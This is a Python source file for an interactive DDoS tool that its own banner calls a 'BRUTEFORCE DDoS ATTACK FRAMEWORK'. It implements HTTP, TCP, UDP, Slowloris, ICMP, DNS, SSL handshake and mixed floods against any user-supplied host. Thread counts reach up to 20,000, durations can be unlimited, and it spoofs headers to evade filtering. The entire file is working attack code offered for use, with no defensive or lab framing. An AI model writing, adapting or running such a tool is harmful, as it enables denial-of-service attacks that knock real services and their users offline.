#!/usr/bin/env python3
import os, sys, platform, socket, threading, time, json, random, struct, subprocess, atexit
from pathlib import Path
from typing import Optional, Dict, List

# ============================================================================
# COLORS - CROSS PLATFORM
# ============================================================================

class C:
    def __init__(self):
        self.use = platform.system() != "Windows"
        if platform.system() == "Windows":
            try:
                import ctypes
                k32 = ctypes.windll.kernel32
                h = k32.GetStdHandle(-11)
                m = ctypes.c_ulong()
                k32.GetConsoleMode(h, ctypes.byref(m))
                m.value |= 0x0004
                k32.SetConsoleMode(h, m)
                self.use = True
            except: pass
    
    def c(self, t, code):
        return f"\033[{code}m{t}\033[0m" if self.use else t
    
    def r(self, t): return self.c(t, "91")
    def g(self, t): return self.c(t, "92")
    def y(self, t): return self.c(t, "93")
    def c_(self, t): return self.c(t, "96")
    def m(self, t): return self.c(t, "95")
    def b(self, t): return self.c(t, "1")

C = C()

def clear(): os.system("cls" if platform.system() == "Windows" else "clear")
def inp(p): return input(C.y(p)).strip()
def log_i(m): print(C.g(f"[+] {m}"))
def log_e(m): print(C.r(f"[!] {m}"))
def log_w(m): print(C.y(f"[*] {m}"))
def log_ok(m): print(C.g(f"[✓] {m}"))
def log_m(m): print(C.c_(f"[M] {m}"))

def rand_str(n): return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(n))
def rand_ip(): return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
def rand_ua(): return random.choice([
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
])

# ============================================================================
# CONFIG - THREAD-SAFE GLOBAL STATE
# ============================================================================

class Cfg:
    def __init__(self):
        self.ip = ""
        self.port = 80
        self.path = "/"
        self.proto = "http"
        self.method = ""
        self.threads = 3000
        self.duration = 0
        
        # Lock-protected metrics
        self.lock = threading.Lock()
        self.packets = 0
        self.bytes = 0
        self.start = 0
        self.running = False
        self.active_threads = 0
        
        # Performance tuning
        self.payload_sz = 8192
        self.batch = 2000
        self.timeout = 2
        self.buf_sz = 67108864
        self.rand_ports = True
        
        self.cfg = Path("config.json")
        self.load()
    
    def load(self):
        if self.cfg.exists():
            try:
                with open(self.cfg) as f:
                    d = json.load(f)
                    if 'threads' in d: self.threads = d['threads']
                    if 'duration' in d: self.duration = d['duration']
                    if 'payload_sz' in d: self.payload_sz = d['payload_sz']
                    if 'batch' in d: self.batch = d['batch']
                    if 'timeout' in d: self.timeout = d['timeout']
            except: pass
    
    def save(self):
        try:
            with open(self.cfg, 'w') as f:
                json.dump({
                    'threads': self.threads,
                    'duration': self.duration,
                    'payload_sz': self.payload_sz,
                    'batch': self.batch,
                    'timeout': self.timeout,
                }, f)
        except: pass
    
    def inc_p(self, n=1):
        with self.lock:
            self.packets += n
    
    def inc_b(self, n):
        with self.lock:
            self.bytes += n
    
    def add_thread(self):
        with self.lock:
            self.active_threads += 1
    
    def remove_thread(self):
        with self.lock:
            self.active_threads = max(0, self.active_threads - 1)
    
    def metrics(self):
        with self.lock:
            elapsed = max(time.time() - self.start, 0.1) if self.start else 0.1
            pps = self.packets / elapsed if elapsed > 0 else 0
            mbps = (self.bytes * 8 / 1_000_000) / elapsed if elapsed > 0 else 0
            return {
                'packets': self.packets,
                'bytes': self.bytes,
                'pps': pps,
                'mbps': mbps,
                'elapsed': elapsed,
                'active': self.active_threads
            }

CFG = Cfg()

# ============================================================================
# TARGET RESOLVER
# ============================================================================

class Resolve:
    @staticmethod
    def parse(target):
        target = target.strip()
        if not target:
            return None
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        try:
            proto = 'https' if target.startswith('https://') else 'http'
            target = target[8:] if proto == 'https' else target[7:]
            
            if '/' in target:
                hostport, path = target.split('/', 1)
                path = '/' + path
            else:
                hostport = target
                path = '/'
            
            if ':' in hostport:
                host, port_str = hostport.rsplit(':', 1)
                try:
                    port = int(port_str)
                except ValueError:
                    return None
            else:
                host = hostport
                port = 443 if proto == 'https' else 80
            
            if not host:
                return None
            
            if port < 1 or port > 65535:
                log_e("Port must be 1-65535")
                return None
            
            try:
                ip = socket.gethostbyname(host)
                log_i(f"Resolved {host} → {ip}")
            except socket.gaierror:
                log_e(f"Cannot resolve {host}")
                return None
            
            return {'ip': ip, 'port': port, 'host': host, 'path': path, 'proto': proto}
        except Exception as e:
            log_e(f"Parse error: {str(e)}")
            return None

# ============================================================================
# SOCKET UTILITIES - SAFE LIFECYCLE MANAGEMENT
# ============================================================================

def create_socket():
    """Create and configure socket with max buffers"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, CFG.buf_sz)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, CFG.buf_sz)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(CFG.timeout)
    except:
        pass
    return sock

def safe_close(sock):
    """Safe socket close with error suppression"""
    if sock:
        try:
            sock.shutdown(socket.SHUT_RDWR)
        except:
            pass
        try:
            sock.close()
        except:
            pass

# ============================================================================
# ATTACK VECTORS - BULLETPROOF
# ============================================================================

class Vector:
    def __init__(self):
        self.cfg = CFG
        self.running = False
    
    def start(self):
        """Start attack threads"""
        with self.cfg.lock:
            self.cfg.packets = 0
            self.cfg.bytes = 0
            self.cfg.start = time.time()
            self.cfg.running = True
            self.cfg.active_threads = 0
        
        self.running = True
        threads = []
        
        for i in range(self.cfg.threads):
            t = threading.Thread(target=self._exec_wrapper, args=(i,), daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.001)  # Stagger thread creation
        
        return threads
    
    def stop(self):
        """Stop attack"""
        self.running = False
        with self.cfg.lock:
            self.cfg.running = False
    
    def _exec_wrapper(self, tid):
        """Wrapper to track active threads"""
        self.cfg.add_thread()
        try:
            self.execute(tid)
        finally:
            self.cfg.remove_thread()
    
    def execute(self, tid):
        """Override in subclass"""
        pass

class HTTPFlood(Vector):
    def execute(self, tid):
        sock = None
        sent = 0
        
        try:
            while self.running:
                if CFG.duration > 0:
                    with CFG.lock:
                        if time.time() - CFG.start > CFG.duration:
                            break
                
                # Reconnect every 300 requests or on socket error
                if not sock or sent >= 300:
                    safe_close(sock)
                    sock = None
                    sent = 0
                    
                    try:
                        sock = create_socket()
                        port = random.randint(50000, 65535) if CFG.rand_ports else CFG.port
                        sock.connect((CFG.ip, port))
                    except socket.error:
                        sock = None
                        time.sleep(0.01)
                        continue
                
                if not sock:
                    continue
                
                # Batch send
                try:
                    for _ in range(CFG.batch):
                        if not self.running:
                            break
                        
                        req = f"GET {CFG.path}?{rand_str(32)}={rand_str(32)} HTTP/1.1\r\n"
                        req += f"Host: {CFG.ip}\r\n"
                        req += f"User-Agent: {rand_ua()}\r\n"
                        req += f"Connection: keep-alive\r\n"
                        req += f"Cache-Control: no-cache\r\n"
                        req += f"X-Forwarded-For: {rand_ip()}\r\n"
                        req += f"Accept: */*\r\n"
                        req += f"Accept-Encoding: gzip\r\n\r\n"
                        
                        b = req.encode()
                        sock.sendall(b)
                        CFG.inc_p(1)
                        CFG.inc_b(len(b))
                        sent += 1
                
                except socket.error:
                    safe_close(sock)
                    sock = None
                    sent = 0
        
        except:
            pass
        finally:
            safe_close(sock)

class TCPFlood(Vector):
    def execute(self, tid):
        try:
            while self.running:
                if CFG.duration > 0:
                    with CFG.lock:
                        if time.time() - CFG.start > CFG.duration:
                            break
                
                # Create batch of connections
                for _ in range(CFG.batch):
                    if not self.running:
                        break
                    
                    sock = None
                    try:
                        sock = create_socket()
                        port = random.randint(50000, 65535) if CFG.rand_ports else CFG.port
                        
                        sock.connect((CFG.ip, port))
                        
                        payload = os.urandom(CFG.payload_sz)
                        sock.sendall(payload)
                        
                        CFG.inc_p(1)
                        CFG.inc_b(len(payload))
                    except socket.error:
                        CFG.inc_p(1)
                    finally:
                        safe_close(sock)
        
        except:
            pass

class UDPFlood(Vector):
    def execute(self, tid):
        sock = None
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, CFG.buf_sz)
            sock.settimeout(CFG.timeout)
            
            while self.running:
                if CFG.duration > 0:
                    with CFG.lock:
                        if time.time() - CFG.start > CFG.duration:
                            break
                
                try:
                    for _ in range(CFG.batch):
                        if not self.running:
                            break
                        
                        payload = os.urandom(CFG.payload_sz)
                        port = random.randint(50000, 65535) if CFG.rand_ports else CFG.port
                        
                        sock.sendto(payload, (CFG.ip, port))
                        CFG.inc_p(1)
                        CFG.inc_b(len(payload))
                except socket.error:
                    pass
        
        except:
            pass
        finally:
            safe_close(sock)

class Slowloris(Vector):
    def execute(self, tid):
        socks = []
        
        try:
            while self.running:
                if CFG.duration > 0:
                    with CFG.lock:
                        if time.time() - CFG.start > CFG.duration:
                            break
                
                # Add new connections
                while len(socks) < 100 and self.running:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(120)
                        sock.connect((CFG.ip, CFG.port))
                        
                        req = f"GET {CFG.path} HTTP/1.1\r\nHost: {CFG.ip}\r\nConnection: keep-alive\r\n"
                        sock.sendall(req.encode())
                        
                        socks.append(sock)
                        CFG.inc_p(1)
                    except socket.error:
                        break
                
                # Send keep-alive headers on all
                dead = []
                for sock in socks:
                    try:
                        header = f"X-{rand_str(16)}: {rand_str(32)}\r\n"
                        sock.sendall(header.encode())
                        CFG.inc_p(1)
                    except socket.error:
                        dead.append(sock)
                
                # Clean dead sockets
                for sock in dead:
                    socks.remove(sock)
                    safe_close(sock)
                
                time.sleep(0.1)
        
        except:
            pass
        finally:
            for sock in socks:
                safe_close(sock)

class ICMPFlood(Vector):
    def execute(self, tid):
        try:
            while self.running:
                if CFG.duration > 0:
                    with CFG.lock:
                        if time.time() - CFG.start > CFG.duration:
                            break
                
                for _ in range(CFG.batch):
                    if not self.running:
                        break
                    
                    try:
                        if platform.system() == "Windows":
                            subprocess.Popen(
                                ['ping', '-n', '1', '-w', '1', CFG.ip],
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                                creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
                            )
                        else:
                            subprocess.Popen(
                                ['ping', '-c', '1', '-W', '1', CFG.ip],
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL
                            )
                        CFG.inc_p(1)
                        CFG.inc_b(56)
                    except:
                        CFG.inc_p(1)
        
        except:
            pass

class DNSFlood(Vector):
    def execute(self, tid):
        sock = None
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, CFG.buf_sz)
            sock.settimeout(CFG.timeout)
            
            while self.running:
                if CFG.duration > 0:
                    with CFG.lock:
                        if time.time() - CFG.start > CFG.duration:
                            break
                
                try:
                    for _ in range(CFG.batch):
                        if not self.running:
                            break
                        
                        qid = random.randint(1, 65535)
                        query = struct.pack('>H', qid) + b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                        query += b'\x07example\x03com\x00\x00\xff\x00\x01'
                        
                        sock.sendto(query, (CFG.ip, 53))
                        CFG.inc_p(1)
                        CFG.inc_b(len(query))
                except socket.error:
                    pass
        
        except:
            pass
        finally:
            safe_close(sock)

class SSLFlood(Vector):
    def execute(self, tid):
        try:
            import ssl
        except ImportError:
            return
        
        try:
            while self.running:
                if CFG.duration > 0:
                    with CFG.lock:
                        if time.time() - CFG.start > CFG.duration:
                            break
                
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(CFG.timeout)
                    
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    
                    ssl_sock = ctx.wrap_socket(sock, server_hostname=CFG.ip)
                    ssl_sock.connect((CFG.ip, CFG.port))
                    
                    for _ in range(5):
                        try:
                            ssl_sock.do_handshake()
                            CFG.inc_p(1)
                        except:
                            break
                    
                    safe_close(ssl_sock)
                except (socket.error, ssl.SSLError):
                    if sock:
                        safe_close(sock)
        
        except:
            pass

class Multi(Vector):
    def execute(self, tid):
        vectors = [HTTPFlood, TCPFlood, UDPFlood, Slowloris, DNSFlood]
        vec_class = random.choice(vectors)
        vec = vec_class()
        vec.running = self.running
        vec.cfg = self.cfg
        vec.execute(tid)

# ============================================================================
# INTERACTIVE MENU
# ============================================================================

class Menu:
    def __init__(self):
        self.vector = None
        self.threads = []
    
    def banner(self):
        clear()
        print(C.b(C.m("""
╔════════════════════════════════════════════════════════╗
║         BRUTEFORCE DDoS ATTACK FRAMEWORK               ║
║  Maximum Throughput | Multiple Vectors | Raw Power    ║
║  Windows • Linux • macOS • Kali • Parrot              ║
╚════════════════════════════════════════════════════════╝
        """)))
    
    def main(self):
        while True:
            self.banner()
            print(C.c_("MAIN MENU"))
            print("=" * 60)
            print("1. Launch Attack")
            print("2. View Settings")
            print("3. Advanced Settings")
            print("4. Save Settings")
            print("5. Load Settings")
            print("6. System Info")
            print("7. Help")
            print("0. Exit")
            print("=" * 60)
            
            choice = inp("Select (0-7): ")
            
            if choice == "1":
                self.attack()
            elif choice == "2":
                self.show_cfg()
            elif choice == "3":
                self.adv_menu()
            elif choice == "4":
                CFG.save()
                log_ok("Settings saved")
                input("")
            elif choice == "5":
                CFG.load()
                log_ok("Settings loaded")
                input("")
            elif choice == "6":
                self.sysinfo()
            elif choice == "7":
                self.help()
            elif choice == "0":
                log_i("Exiting...")
                sys.exit(0)
            else:
                log_e("Invalid option")
                input("")
    
    def attack(self):
        clear()
        print(C.c_("TARGET SETUP"))
        print("=" * 60)
        
        while True:
            target = inp("Enter target (IP:port or URL): ")
            if not target:
                log_e("Target required")
                continue
            
            parsed = Resolve.parse(target)
            if parsed:
                CFG.ip = parsed['ip']
                CFG.port = parsed['port']
                CFG.path = parsed['path']
                CFG.proto = parsed['proto']
                log_ok(f"Target: {parsed['proto']}://{parsed['ip']}:{parsed['port']}{parsed['path']}")
                break
            else:
                log_e("Invalid target")
        
        clear()
        print(C.c_("SELECT ATTACK TYPE"))
        print("=" * 60)
        print("1. HTTP Flood (Layer 7)")
        print("2. TCP Flood (Layer 4)")
        print("3. UDP Flood (Layer 4)")
        print("4. Slowloris (Connection Exhaustion)")
        print("5. ICMP Flood (Layer 3)")
        print("6. DNS Flood")
        print("7. SSL/TLS Renegotiation")
        print("8. Multi-Vector Attack")
        print("=" * 60)
        
        attack_map = {
            "1": ("HTTP Flood", HTTPFlood),
            "2": ("TCP Flood", TCPFlood),
            "3": ("UDP Flood", UDPFlood),
            "4": ("Slowloris", Slowloris),
            "5": ("ICMP Flood", ICMPFlood),
            "6": ("DNS Flood", DNSFlood),
            "7": ("SSL Flood", SSLFlood),
            "8": ("Multi-Vector", Multi),
        }
        
        while True:
            choice = inp("Select attack (1-8): ")
            if choice in attack_map:
                CFG.method, self.vector = attack_map[choice]
                log_ok(f"Attack: {CFG.method}")
                break
            else:
                log_e("Invalid option")
        
        clear()
        print(C.c_("PERFORMANCE TUNING"))
        print("=" * 60)
        
        while True:
            try:
                threads = int(inp("Threads (100-20000) [default 3000]: ") or "3000")
                if 100 <= threads <= 20000:
                    CFG.threads = threads
                    log_ok(f"Threads: {threads}")
                    break
                else:
                    log_e("Must be 100-20000")
            except ValueError:
                log_e("Invalid number")
        
        while True:
            try:
                duration = int(inp("Duration in seconds (0=unlimited) [default 60]: ") or "60")
                if 0 <= duration <= 10800:
                    CFG.duration = duration
                    dur_text = "Unlimited" if duration == 0 else f"{duration}s"
                    log_ok(f"Duration: {dur_text}")
                    break
                else:
                    log_e("Must be 0-10800")
            except ValueError:
                log_e("Invalid number")
        
        while True:
            try:
                batch = int(inp("Batch size (100-10000) [default 2000]: ") or "2000")
                if 100 <= batch <= 10000:
                    CFG.batch = batch
                    log_ok(f"Batch size: {batch}")
                    break
                else:
                    log_e("Must be 100-10000")
            except ValueError:
                log_e("Invalid number")
        
        self.summary()
        
        confirm = inp("Launch attack? (yes/no): ").lower()
        if confirm in ["yes", "y"]:
            self.run()
        else:
            log_e("Cancelled")
            input("")
    
    def summary(self):
        clear()
        print(C.c_("ATTACK SUMMARY"))
        print("=" * 60)
        print(f"Target:      {C.y(CFG.ip)}:{C.y(str(CFG.port))}")
        print(f"Protocol:    {C.y(CFG.proto.upper())}")
        print(f"Attack Type: {C.y(CFG.method)}")
        print(f"Threads:     {C.y(str(CFG.threads))}")
        print(f"Duration:    {C.y('Unlimited' if CFG.duration == 0 else f'{CFG.duration}s')}")
        print(f"Batch Size:  {C.y(str(CFG.batch))}")
        print(f"Payload:     {C.y(str(CFG.payload_sz))} bytes")
        print("=" * 60)
    
    def run(self):
        clear()
        log_i(f"Launching {CFG.method} attack...")
        print("=" * 60)
        
        vector = self.vector()
        self.threads = vector.start()
        
        log_ok(f"Attack running with {len(self.threads)} threads")
        print("=" * 60)
        print(C.y("Press Ctrl+C to stop"))
        print("=" * 60)
        
        try:
            last_report = time.time()
            
            while vector.running:
                now = time.time()
                
                if CFG.duration > 0:
                    with CFG.lock:
                        if now - CFG.start > CFG.duration:
                            vector.stop()
                            break
                
                if now - last_report >= 2:
                    m = CFG.metrics()
                    log_m(f"Active: {m['active']:,} | Packets: {m['packets']:,} | Bytes: {m['bytes']:,} | PPS: {m['pps']:.0f} | Mbps: {m['mbps']:.2f}")
                    last_report = now
                
                time.sleep(0.05)
        
        except KeyboardInterrupt:
            print("\n")
            log_e("Interrupted")
            vector.stop()
        
        log_i("Waiting for cleanup...")
        vector.stop()
        
        for t in self.threads:
            t.join(timeout=2)
        
        time.sleep(0.5)
        self.report()
    
    def report(self):
        clear()
        print(C.g("=" * 60))
        print(C.b("ATTACK COMPLETE"))
        print(C.g("=" * 60))
        
        m = CFG.metrics()
        
        print(f"Type:        {C.c_(CFG.method)}")
        print(f"Target:      {C.c_(CFG.ip + ':' + str(CFG.port))}")
        print(f"Threads:     {C.c_(str(CFG.threads))}")
        duration_f = f"{m['elapsed']:.2f}s"
        print(f"Duration:    {C.c_(duration_f)}")
        packets_f = f"{m['packets']:,}"
        print(f"Packets:     {C.y(packets_f)}")
        bytes_f = f"{m['bytes']:,}"
        print(f"Bytes:       {C.y(bytes_f)}")
        pps_f = f"{m['pps']:.0f}"
        print(f"PPS:         {C.g(pps_f)}")
        mbps_f = f"{m['mbps']:.2f}"
        print(f"Mbps:        {C.g(mbps_f)}")
        print(C.g("=" * 60))
        
        input("")
    
    def show_cfg(self):
        clear()
        print(C.c_("CURRENT SETTINGS"))
        print("=" * 60)
        print(f"Target:      {CFG.ip}:{CFG.port}")
        print(f"Attack:      {CFG.method}")
        print(f"Threads:     {CFG.threads}")
        print(f"Duration:    {CFG.duration}s")
        print(f"Batch:       {CFG.batch}")
        print(f"Payload:     {CFG.payload_sz} bytes")
        print("=" * 60)
        input("")
    
    def adv_menu(self):
        while True:
            clear()
            print(C.c_("ADVANCED SETTINGS"))
            print("=" * 60)
            print(f"1. Payload Size: {C.y(str(CFG.payload_sz))} bytes")
            print(f"2. Batch Size: {C.y(str(CFG.batch))}")
            print(f"3. Connection Timeout: {C.y(str(CFG.timeout))}s")
            print(f"4. Socket Buffer: {C.y(str(CFG.buf_sz))} bytes")
            print(f"5. Random Ports: {C.y('ON' if CFG.rand_ports else 'OFF')}")
            print("0. Back")
            print("=" * 60)
            
            choice = inp("Select: ")
            
            if choice == "1":
                try:
                    size = int(inp("Payload size (64-65535): ") or str(CFG.payload_sz))
                    if 64 <= size <= 65535:
                        CFG.payload_sz = size
                        log_ok(f"Payload: {size} bytes")
                    else:
                        log_e("Must be 64-65535")
                    input("")
                except ValueError:
                    log_e("Invalid")
                    input("")
            
            elif choice == "2":
                try:
                    batch = int(inp("Batch size (100-10000): ") or str(CFG.batch))
                    if 100 <= batch <= 10000:
                        CFG.batch = batch
                        log_ok(f"Batch: {batch}")
                    else:
                        log_e("Must be 100-10000")
                    input("")
                except ValueError:
                    log_e("Invalid")
                    input("")
            
            elif choice == "3":
                try:
                    timeout = int(inp("Timeout (1-30): ") or str(CFG.timeout))
                    if 1 <= timeout <= 30:
                        CFG.timeout = timeout
                        log_ok(f"Timeout: {timeout}s")
                    else:
                        log_e("Must be 1-30")
                    input("")
                except ValueError:
                    log_e("Invalid")
                    input("")
            
            elif choice == "4":
                try:
                    buf = int(inp("Buffer size (1048576-268435456): ") or str(CFG.buf_sz))
                    if 1048576 <= buf <= 268435456:
                        CFG.buf_sz = buf
                        log_ok(f"Buffer: {buf} bytes")
                    else:
                        log_e("Must be 1MB-256MB")
                    input("")
                except ValueError:
                    log_e("Invalid")
                    input("")
            
            elif choice == "5":
                CFG.rand_ports = not CFG.rand_ports
                log_ok(f"Random ports: {'ON' if CFG.rand_ports else 'OFF'}")
                input("")
            
            elif choice == "0":
                break
            
            else:
                log_e("Invalid")
                input("")
    
    def sysinfo(self):
        clear()
        print(C.c_("SYSTEM INFORMATION"))
        print("=" * 60)
        print(f"OS:       {platform.system()} {platform.release()}")
        print(f"Python:   {platform.python_version()}")
        print(f"Arch:     {platform.architecture()[0]}")
        print(f"Proc:     {platform.processor() or 'Unknown'}")
        print("=" * 60)
        input("")
    
    def help(self):
        clear()
        print(C.c_("HELP & DOCUMENTATION"))
        print("=" * 60)
        print("\nATTACK TYPES:")
        print("  HTTP Flood   - Layer 7 application attacks")
        print("  TCP Flood    - Layer 4 connection exhaustion")
        print("  UDP Flood    - Layer 4 volumetric (fastest)")
        print("  Slowloris    - Keep connections alive")
        print("  ICMP Flood   - Layer 3 ping flood")
        print("  DNS Flood    - DNS query flood")
        print("  SSL Flood    - TLS handshake attacks")
        print("  Multi        - All vectors simultaneously")
        print("\nSETTINGS:")
        print("  Threads:     100-20000 (higher = more throughput)")
        print("  Payload:     64-65535 bytes (larger = more bandwidth)")
        print("  Batch:       100-10000 (packets per cycle)")
        print("  Duration:    0=unlimited, or seconds")
        print("\nKEYBOARDS:")
        print("  Ctrl+C - Stop attack gracefully")
        print("=" * 60)
        input("")

# ============================================================================
# MAIN
# ============================================================================

def cleanup():
    """Cleanup on exit"""
    try:
        CFG.stop()
    except:
        pass

def main():
    atexit.register(cleanup)
    
    try:
        menu = Menu()
        menu.main()
    except KeyboardInterrupt:
        print("\n")
        log_e("Exiting...")
        sys.exit(0)
    except Exception as e:
        log_e(f"Fatal: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
